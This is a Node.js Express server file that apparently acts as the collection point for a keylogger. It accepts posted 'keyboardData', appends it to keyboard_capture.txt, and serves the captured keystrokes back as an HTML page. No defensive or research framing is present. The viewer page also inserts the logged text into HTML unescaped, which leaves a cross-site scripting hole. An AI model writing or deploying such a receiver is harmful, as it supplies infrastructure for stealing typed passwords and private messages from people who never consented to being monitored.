// Import required modules
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// Create the express app
const app = express();

// Use bodyParser to parse JSON requests
app.use(bodyParser.json());

// Define the port (use process.env.PORT for deployment)
const PORT = process.env.PORT || 8080;

// Handle GET requests to "/"
app.get("/", (req, res) => {
    try {
        // Read logged data from keyboard_capture.txt
        const logData = fs.readFileSync("./keyboard_capture.txt", "utf8");
        res.send(`<h1>Logged Data</h1><p>${logData.replace(/\n/g, "<br>")}</p>`);
    } catch (error) {
        res.send("<h1>No data logged yet.</h1>");
    }
});

// Handle POST requests to "/"
app.post("/", (req, res) => {
    if (!req.body.keyboardData) {
        return res.status(400).send("Error: No keyboard data received");
    }

    // Log the received keyboard data to the console
    console.log("Received Keyboard Data:", req.body.keyboardData);

    // Write data to file (append instead of overwrite)
    fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");

    res.send("Successfully logged the data");
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
